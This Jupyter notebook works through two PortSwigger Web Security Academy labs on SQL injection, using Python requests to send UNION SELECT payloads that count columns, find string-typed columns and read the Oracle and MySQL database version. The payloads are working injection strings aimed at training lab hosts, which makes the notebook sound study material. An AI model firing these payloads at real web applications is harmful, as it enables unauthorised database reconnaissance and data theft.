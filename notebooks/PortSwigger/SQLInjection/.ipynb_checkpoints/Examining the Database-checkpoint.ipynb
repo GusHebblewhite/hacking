{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "78a1c138",
   "metadata": {},
   "source": [
    "https://portswigger.net/web-security/sql-injection/examining-the-database"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "55d87940",
   "metadata": {},
   "source": [
    "# Question 1 : Oracle\n",
    "\n",
    "\n",
    "https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 45,
   "id": "fb11dded",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[<Response [500]>, <Response [200]>, <Response [500]>, <Response [500]>]\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "\n",
    "URL = \"https://ac1e1f461e951c0c80ae807400e0008c.web-security-academy.net/\"\n",
    "\n",
    "#Work out how many columns the returned query has\n",
    "results = []\n",
    "for x in range(1, 5):\n",
    "    #NB we need to add \"FROM DUAL\" because this is an oracle database\n",
    "    query = \"filter?category='+UNION+SELECT+{}+FROM+DUAL--\".format((\"NULL,\" * x)[:-1])\n",
    "    r = requests.get(URL + query)\n",
    "    results.append(r)\n",
    "print(results)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "134420da",
   "metadata": {},
   "source": [
    "From the responses we can see that we have two columns returned. \n",
    "\n",
    "Next we want to work out which field will accept string data types:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 46,
   "id": "4e946226",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[<Response [200]>, <Response [200]>]\n"
     ]
    }
   ],
   "source": [
    "results = []\n",
    "\n",
    "n_columns = 2\n",
    "for x in range(n_columns):\n",
    "    NULLs = [\"NULL\"]*n_columns\n",
    "    NULLs[x] = \"\\'a\\'\"\n",
    "    query = \"filter?category='+UNION+SELECT+{}+FROM+DUAL--\".format(\",\".join(NULLs))\n",
    "    r = requests.get(URL + query)\n",
    "    results.append(r)\n",
    "print(results)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "78a6045f",
   "metadata": {},
   "source": [
    "Either of the two columns seem to be compatible with text. \n",
    "\n",
    "Ok so now that we've done the reconnaissance let's actually run our union attack to get the database information.\n",
    "\n",
    "One quick thing to note here is that Oracle returns the database information in a single column with the heading \"BANNER\". Since the original database has two columns we need to add a column to our query so the UNION works."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 47,
   "id": "1b75db66",
   "metadata": {},
   "outputs": [],
   "source": [
    "#Final payload\n",
    "query = \"filter?category='+UNION+SELECT+BANNER,'a'+FROM+V$VERSION--\"\n",
    "r = requests.get(URL + query)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "44a43d06",
   "metadata": {},
   "source": [
    "Success!"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a4aa622d",
   "metadata": {},
   "source": [
    "# Question 2 : MySQL\n",
    "\n",
    "https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 62,
   "id": "3d257357",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[<Response [500]>, <Response [200]>, <Response [500]>, <Response [500]>]\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "\n",
    "URL = \"https://ac131f981fa34dc980990ee8009800aa.web-security-academy.net/\"\n",
    "\n",
    "#Work out how many columns the returned query has\n",
    "results = []\n",
    "for x in range(1, 5):\n",
    "    #NB we need to add a space after the comment for MySQL\n",
    "    query = \"filter?category=' UNION SELECT+{}-- \".format((\"NULL,\" * x)[:-1])\n",
    "    r = requests.get(URL + query)\n",
    "    results.append(r)\n",
    "print(results)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e3eac3eb",
   "metadata": {},
   "source": [
    "As in the oracle case we have two columns.\n",
    "\n",
    "Now lets check which are text compatible:\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 67,
   "id": "d173039d",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[<Response [200]>, <Response [200]>]\n"
     ]
    }
   ],
   "source": [
    "#Work out how many columns the returned query has\n",
    "results = []\n",
    "n_columns = 2\n",
    "for x in range(n_columns):\n",
    "    NULLs = [\"NULL\"] * n_columns\n",
    "    NULLs[x] = \"\\'a\\'\"\n",
    "    #NB we need to add a space after the comment for MySQL\n",
    "    query = \"filter?category=' UNION SELECT+{} -- \".format(\",\".join(NULLs))\n",
    "    r = requests.get(URL + query)\n",
    "    results.append(r)\n",
    "print(results)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "db764461",
   "metadata": {},
   "source": [
    "Once again both columns are string compatible. Cool. Ok now for the payload."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 83,
   "id": "572b438f",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<Response [200]>\n"
     ]
    }
   ],
   "source": [
    "#Final payload\n",
    "query = \"filter?category=' UNION SELECT NULL,@@version -- \"\n",
    "r = requests.get(URL + query)\n",
    "print(r)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6d748eaf",
   "metadata": {},
   "source": [
    "Yay it worked! Now we just need to paste it into the PortSwigger lab."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 84,
   "id": "3d2d8074",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "\"filter?category='+UNION+SELECT+NULL,@@version+--+\""
      ]
     },
     "execution_count": 84,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "query.replace(\" \", \"+\")"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
